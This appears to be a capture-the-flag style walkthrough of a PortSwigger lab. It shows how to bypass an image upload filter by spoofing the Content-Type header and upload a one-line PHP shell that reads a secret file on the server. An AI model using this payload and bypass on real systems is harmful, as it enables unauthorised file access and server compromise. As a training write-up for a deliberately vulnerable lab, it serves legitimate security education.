# Lab-2: [Web shell upload via Content-Type restriction bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)

This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.

**Aim :-** To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file ``` /home/carlos/secret ```. Submit this secret using the button provided in the lab banner. 

You can log in to your own account using the following credentials: ``` wiener:peter ```.



## Solution
- Login as ``` wiener ```.
    - Username : ``` wiener ```.
    - Password : ``` peter ```.

- There will be a option to upload image.

- Copy the following code and save it in a file, name it as ``` exploit.php ```.
    - ``` <?php echo file_get_contents('/home/carlos/secret'); ?> ```.

- Upload the ``` exploit.php ```. Server will respond with ``` Sorry, file type application/octet-stream is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file. ``` error message.

- Upload it again and intercept the request using **burp suite**.

- Change the value of ``` Content-Type ``` to ``` image/jpeg ``` in the request header, and forward the request.

- Now the file is uploaded successfully.

- Open the image in new tab by going to ``` /files/avatars/exploit.php ```.

- Server will respond with a secret code, copy it and submit as solution.